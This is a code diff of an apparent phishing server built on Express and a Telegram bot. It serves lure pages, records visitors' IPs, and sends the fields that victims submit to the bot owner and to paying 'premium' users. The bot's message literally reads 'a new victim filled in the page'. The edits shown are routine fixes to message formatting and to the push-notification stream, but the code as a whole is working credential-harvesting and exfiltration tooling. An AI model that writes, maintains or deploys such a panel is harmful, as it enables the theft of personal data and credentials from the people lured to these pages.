@@ -1049,7 +1049,7 @@ app.get("/p/u/:uid", (req, res) => {
     bot.sendMessage(Number(uid), `👁️ شخص فتح صفحتك!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
     bot.sendMessage(BOT_OWNER, `👁️ [صفحة ${uid}] شخص فتح صفحة المستخدم!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
   });
-  res.render("dynpage", { cfg, host: hostURL }, (err, html) => {
+  res.render("dynpage", { cfg, host: hostURL, pageUid: uid }, (err, html) => {
     if (err) return res.status(500).send("Error: " + err.message);
     res.send(html);
   });
@@ -1075,8 +1075,8 @@ app.post("/p/u/:uid/submit", express.json({limit:"1mb"}), async (req, res) => {
   const sub = { time: new Date().toJSON().slice(0,19).replace('T',' '), fields, device, platform, ip, country: info?.split("\n")[0]?.split("|")[1]?.trim()||"" };
   addUserSub(uid, sub);
   const fText = Object.entries(fields).map(([k,v])=>`${k}: ${v}`).join("\n");
-  bot.sendMessage(Number(uid), `✅ *بيانات جديدة من صفحتك!*\n\n${fText}\n\n📱 ${device||'?'} | 🌍 ${sub.country||'?'}\n⚓ ${ip}`, {parse_mode:"Markdown"}).catch(()=>{});
-  bot.sendMessage(BOT_OWNER, `✅ [صفحة ${uid}] بيانات جديدة!\n${fText}\n📱 ${device||'?'}\n⚓ ${ip}`, {parse_mode:"Markdown"}).catch(()=>{});
+  bot.sendMessage(Number(uid), `✅ بيانات جديدة من صفحتك!\n\n${fText}\n\n📱 ${device||'?'} | 🌍 ${sub.country||'?'}\n⚓ ${ip}`).catch(()=>{});
+  bot.sendMessage(BOT_OWNER, `✅ [صفحة ${uid}] بيانات جديدة!\n${fText}\n📱 ${device||'?'}\n⚓ ${ip}`).catch(()=>{});
 });
 
 app.get("/p", (req, res) => {
@@ -1096,7 +1096,7 @@ app.get("/p", (req, res) => {
   enrichIP(ip).then(info => {
     bot.sendMessage(BOT_OWNER, `👁️ شخص فتح الصفحة الديناميكية!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
   });
-  res.render("dynpage", { cfg: pageConfig, host: hostURL }, (err, html) => {
+  res.render("dynpage", { cfg: pageConfig, host: hostURL, pageUid: null }, (err, html) => {
     if (err) {
       console.error("dynpage render error:", err.message);
       return res.status(500).send("Server error: " + err.message);
@@ -1125,17 +1125,17 @@ app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
     }
     submissions.push(sub);
     saveSubmissions();
-    let txt = `🎯 *ضحية جديدة ملأت الصفحة!*\n━━━━━━━━━━━━━━━━━━━\n`;
-    for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
+    let txt = `🎯 ضحية جديدة ملأت الصفحة!\n━━━━━━━━━━━━━━━━━━━\n`;
+    for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: ${v}\n`;
     txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
     const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
-    bot.sendMessage(BOT_OWNER, txt, {parse_mode:"Markdown", reply_markup:JSON.stringify(kb)}).catch(()=>{});
+    bot.sendMessage(BOT_OWNER, txt, {reply_markup:JSON.stringify(kb)}).catch(()=>{});
     // Forward to premium users who have receiveOwnerSubs enabled
     for (const [uid, pdata] of Object.entries(premium)) {
       if (Number(uid) === BOT_OWNER) continue;
       if (!isPremium(Number(uid))) continue;
       if (!pdata.receiveOwnerSubs) continue;
-      bot.sendMessage(Number(uid), txt, {parse_mode:"Markdown"}).catch(()=>{});
+      bot.sendMessage(Number(uid), txt).catch(()=>{});
     }
   });
 });
@@ -4632,7 +4632,7 @@ app.get("/push-stream", (req, res) => {
     }
   }
 
-  const hb = setInterval(() => { try { res.write(": hb\n\n"); } catch(e) {} }, 15000);
+  const hb = setInterval(() => { try { if (!res.writableEnded && !res.destroyed) res.write(": hb\n\n"); } catch(e) { clearInterval(hb); if (sseClients[pid] === res) delete sseClients[pid]; } }, 5000);
   req.on("close", () => {
     clearInterval(hb);
     if (sseClients[pid] === res) delete sseClients[pid];
@@ -4658,11 +4658,12 @@ app.post("/push-subscribe", (req, res) => {
 async function sendPushToDevice(pid, title, body, url) {
   // 1. Try SSE first (instant, if page is open)
   const client = sseClients[pid];
-  if (client) {
+  if (client && !client.writableEnded && !client.destroyed) {
     try {
-      client.write(`event: push\ndata: ${JSON.stringify({ title, body, url: url || null })}\n\n`);
-      return "sse";
-    } catch(e) { delete sseClients[pid]; }
+      const ok = client.write(`event: push\ndata: ${JSON.stringify({ title, body, url: url || null })}\n\n`);
+      if (ok !== false) return "sse";
+    } catch(e) { /* fall through */ }
+    delete sseClients[pid];
   }
   // 2. Fallback to VAPID (background, page closed)
   const entry = pushSubs[pid];
